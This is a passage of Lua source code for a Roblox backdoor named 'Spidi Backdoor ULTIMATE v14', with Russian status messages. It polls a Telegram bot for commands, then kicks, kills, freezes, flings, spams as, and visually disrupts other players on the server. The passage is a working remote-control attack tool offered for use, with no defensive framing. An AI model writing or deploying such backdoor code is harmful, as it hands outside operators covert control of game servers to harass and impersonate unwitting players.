        if not target then
            sendMessage("❌ "..err)
            return
        end
        sayMessage(target, msg)
        sendMessage("✅ Сказано от имени <b>"..target.Name.."</b>: "..msg)
        return
    end
    
    if cmd == "spam" then
        local name = args[1]
        local count = tonumber(args[2]) or 5
        local msg = table.concat(args, " ", 3)
        if not name then
            sendMessage("❌ /spam [ник/номер] [кол-во] [текст]")
            return
        end
        if msg == "" then
            sendMessage("❌ Введи текст: /spam ник кол-во текст")
            return
        end
        local target, err = findPlayer(name)
        if not target then
            sendMessage("❌ "..err)
            return
        end
        for i = 1, math.min(count, 20) do
            task.wait(0.1)
            sayMessage(target, msg.." "..i)
        end
        sendMessage("✅ Спам отправлен от имени <b>"..target.Name.."</b> ("..math.min(count, 20).." раз)")
        return
    end
    
    if cmd == "message" then
        local name = args[1]
        local msg = table.concat(args, " ", 2)
        if not name then
            sendMessage("❌ /message [ник/номер] [текст]")
            return
        end
        if msg == "" then
            sendMessage("❌ Введи текст: /message ник текст")
            return
        end
        local target, err = findPlayer(name)
        if not target then
            sendMessage("❌ "..err)
            return
        end
        if not canSendMessage(target) then
            sendMessage("⏳ Подожди 0.3 сек перед следующим сообщением")
            return
        end
        showNotification(target, msg, 5)
        sendMessage("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
        return
    end
    
    if cmd == "teleport" or cmd == "bring" then
        local name1 = args[1]
        local name2 = args[2]
        if not name1 or not name2 then
            sendMessage("❌ /"..cmd.." [ник1/номер1] [ник2/номер2]")
            return
        end
        local target1, err1 = findPlayer(name1)
        if not target1 then
            sendMessage("❌ "..err1)
            return
        end
        local target2, err2 = findPlayer(name2)
        if not target2 then
            sendMessage("❌ "..err2)
            return
        end
        local hrp1 = target1.Character and target1.Character:FindFirstChild("HumanoidRootPart")
        local hrp2 = target2.Character and target2.Character:FindFirstChild("HumanoidRootPart")
        if not hrp1 or not hrp2 then
            sendMessage("❌ Не найден персонаж у одного из игроков")
            return
        end
        if cmd == "teleport" then
            hrp1.CFrame = hrp2.CFrame + Vector3.new(0, 3, 0)
            sendMessage("📍 <b>"..target1.Name.."</b> телепортирован к <b>"..target2.Name.."</b>")
        else
            hrp2.CFrame = hrp1.CFrame + Vector3.new(0, 3, 0)
            sendMessage("📍 <b>"..target2.Name.."</b> притянут к <b>"..target1.Name.."</b>")
        end
        return
    end
    
    local name = args[1]
    if not name then
        sendMessage("❌ Укажи ник или номер игрока")
        return
    end
    
    local target, err = findPlayer(name)
    if not target then
        sendMessage("❌ "..err)
        return
    end
    
    if target == myPlayer then
        if cmd == "kick" or cmd == "ban" then
            sendMessage("❌ Нельзя кикнуть/забанить самого себя!")
            return
        end
    end
    
    local char = target.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local humanoid = char and char:FindFirstChild("Humanoid")
    
    if cmd == "kick" then
        local reason = table.concat(args, " ", 2)
        if reason == "" or reason == name then
            target:Kick("Kicked by Spidi Backdoor")
        else
            target:Kick(reason)
        end
        sendMessage("✅ Кикнут: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (Причина: "..reason..")" or ""))
        return
    end
    
    if cmd == "ban" then
        local reason = table.concat(args, " ", 2)
        if reason == "" or reason == name then
            target:Kick("Banned by Spidi Backdoor")
        else
            target:Kick(reason)
        end
        sendMessage("✅ Забанен: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (Причина: "..reason..")" or ""))
        return
    end
    
    if cmd == "unban" then
        target:Kick("Unbanned by Spidi Backdoor")
        sendMessage("✅ Разбанен: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "kill" then
        if humanoid then
            humanoid.Health = 0
            sendMessage("💀 Убит: <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "freeze" then
        if hrp and humanoid then
            hrp.Anchored = true
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            sendMessage("🧊 Заморожен: <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "unfreeze" then
        if hrp and humanoid then
            hrp.Anchored = false
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
            sendMessage("🔥 Разморожен: <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "fly" and hrp then
        local bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(1,1,1)*1e8
        bv.Velocity = Vector3.new(0, 50, 0)
        bv.Parent = hrp
        Debris:AddItem(bv, 5)
        sendMessage("✈️ Полетел: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "unfly" and hrp then
        for _, v in pairs(hrp:GetChildren()) do
            if v:IsA("BodyVelocity") then
                v:Destroy()
            end
        end
        sendMessage("🛑 Отключен полет: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "crash" and hrp then
        local pos = hrp.Position
        for i = 1, 100 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(5,5,5)
            p.Position = pos + Vector3.new(math.random(-50,50), math.random(-50,50), math.random(-50,50))
            p.Anchored = true
            p.Parent = Workspace
            Debris:AddItem(p, 2)
        end
        sendMessage("💥 Крашнут: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "fling" then
        flingPlayer(target)
        sendMessage("🌀 Флинг на <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "loopkill" and humanoid then
        spawn(function()
            for i = 1, 10 do
                if not target or not target.Character then break end
                local hum = target.Character:FindFirstChild("Humanoid")
                if hum then
                    hum.Health = 0
                end
                task.wait(0.5)
            end
        end)
        sendMessage("🔄 Loopkill на <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "stun" then
        if humanoid then
            stunPlayer(target)
            sendMessage("⚡ Оглушен на 3 сек: <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "jump" and humanoid then
        humanoid.Jump = true
        sendMessage("🦘 Прыжок: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "spin" then
        local speed = tonumber(args[2]) or 1
        speed = math.clamp(speed, 0.5, 10)
        if spinPlayer(target, speed) then
            sendMessage("🔄 Вращение ("..speed.."x): <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "unspin" then
        if unspinPlayer(target) then
            sendMessage("✅ Остановлено вращение: <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Не найден персонаж или вращение не активно у <b>"..target.Name.."</b>")
        end
        return
    end
    
    if cmd == "explode" and hrp then
        local pos = hrp.Position
        for i = 1, 30 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(3,3,3)
            p.Position = pos + Vector3.new(math.random(-20,20), math.random(-20,20), math.random(-20,20))
            p.Anchored = true
            p.Material = Enum.Material.Neon
            p.BrickColor = BrickColor.new("Bright red")
            p.Parent = Workspace
            Debris:AddItem(p, 1)
        end
        sendMessage("💥 Взрыв: <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "des" then
        desorientPlayer(target)
        sendMessage("🌀 Дезориентация камеры (3 сек): <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "warp" then
        local level = tonumber(args[2]) or 5
        level = math.clamp(level, 1, 10)
        local blur = Lighting:FindFirstChild("SpidiWarp")
        if not blur then
            blur = Instance.new("BlurEffect")
            blur.Name = "SpidiWarp"
            blur.Parent = Lighting
        end
        blur.Size = level * 3
        sendMessage("🌀 Размытие "..level.."/10 на <b>"..target.Name.."</b>")
        return
    end
    
    if cmd == "unwarp" then
        local blur = Lighting:FindFirstChild("SpidiWarp")
        if blur then
            blur:Destroy()
            sendMessage("✅ Размытие убрано у <b>"..target.Name.."</b>")
        else
            sendMessage("❌ Нет активного размытия у <b>"..target.Name.."</b>")
        end
        return
    end
    
    sendMessage("❌ Неизвестная команда. /help")
end

-- ==================== УВЕДОМЛЕНИЯ ====================
local oldPlayers = {}
local function checkNewPlayers()
    for _, p in pairs(Players:GetPlayers()) do
        if not oldPlayers[p.UserId] then
            if p:FindFirstChild("SpidiUser") then                addScriptUser(p)
            end
            oldPlayers[p.UserId] = true
        end
    end
end

spawn(function()
    while true do
        pcall(checkNewPlayers)
        wait(3)
    end
end)

-- ==================== ОПРОС TELEGRAM ====================
local lastId = 0
local function pollUpdates()
    local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId+1)
    local res = httpRequest(url, "GET", {})
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.result then
            for _, update in pairs(data.result) do
                if update.message and update.message.text then
                    local msg = update.message
                    local msgId = update.update_id
                    
                    -- Пропускаем старые команды (до включения скрипта)
                    if msgId <= LAST_PROCESSED_ID then
                        goto skip_update
                    end
                    
                    if not CHAT_ID then
                        CHAT_ID = msg.chat.id
                        sendMessage("✅ Spidi Backdoor ULTIMATE v14 запущен!\n👤 Hacker228")
                    end
                    
                    local text = msg.text
                    if text:sub(1,1) == "/" then
                        local parts = {}
                        for w in string.gmatch(text, "%S+") do
                            table.insert(parts, w)
                        end
                        local cmd = parts[1]:sub(2):lower()
                        table.remove(parts, 1)
                        handleCommand(cmd, parts, msg.from.username)
                    end
                    
                    ::skip_update::
                    if update.update_id then
                        lastId = update.update_id
                        if LAST_PROCESSED_ID < update.update_id then
                            LAST_PROCESSED_ID = update.update_id
                        end
                    end
                end
            end
        end
    end
end

spawn(function()
    while true do
        pcall(pollUpdates)
        wait(2)
    end
end)

wait(3)
getChatId()

if CHAT_ID then
    sendMessage("✅ Spidi Backdoor ULTIMATE v14 запущен!\n👤 Hacker228\n📋 /players - пользователи скрипта\n📋 /pc - все игроки на сервере\n🛑 /rm - остановить все процессы")
end
